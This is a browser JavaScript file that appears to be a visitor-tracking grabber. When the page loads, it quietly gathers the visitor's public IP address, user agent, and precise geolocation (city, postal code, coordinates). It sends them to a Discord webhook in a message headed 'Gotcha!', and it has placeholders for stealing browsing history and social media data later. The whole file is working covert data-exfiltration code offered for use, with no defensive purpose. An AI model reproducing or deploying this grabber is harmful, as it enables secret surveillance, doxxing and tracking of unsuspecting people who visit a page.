fetch('./config.json')
  .then(function(response) {
    return response.json();
  })
  .then(function(config) {
    const webhook = config.webhook;

    const request = async () => {
      const response = await fetch('https://api.ipify.org/?format=json');
      const data = await response.json();

      const ip = data.ip;

      const userAgent = navigator.userAgent;
      const locationData = await fetch('https://geolocation-db.com/json/');
      const locationResult = await locationData.json();

      // Code to access browsing history
      const browsingHistory = "Not Working 🏧";

      // Code to access social media data
      const socialMediaData = "Not Working 🏧";

      const message = {
  username: 'By 1onlyremo🦇',
  avatar_url: 'https://www.discordavatars.com/wp-content/uploads/2020/05/hacker-avatar-023.jpg',
  embeds: [
    {
      title: 'User Info',
      description: 'Gotcha! Here is the detailed info about the user 👀',
      fields: [
        {
          name: 'IP Address',
          value: ip
        },
        {
          name: 'User Agent',
          value: userAgent
        },
        {
          name: 'Location Data',
          value: `Country Code: ${locationResult.country_code}\nCountry Name: ${locationResult.country_name}\nCity: ${locationResult.city}\nPostal: ${locationResult.postal}\nLatitude: ${locationResult.latitude}\nLongitude: ${locationResult.longitude}`
        },
        {
          name: 'Browsing History',
          value: 'Coming Soon: ' + browsingHistory
        },
        {
          name: 'Social Media Profiles',
          value: 'Coming Soon: ' + socialMediaData
        }
      ],
      footer: {
        text: 'Made By 1onlyremo#7312'
      }
    }
  ]
};
      

      fetch(webhook, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
      })
        .then(() => {
          console.log('Message sent successfully!');
        })
        .catch((error) => {
          console.error('Error while sending the message:', error);
        });
    };

    
    request();
  });
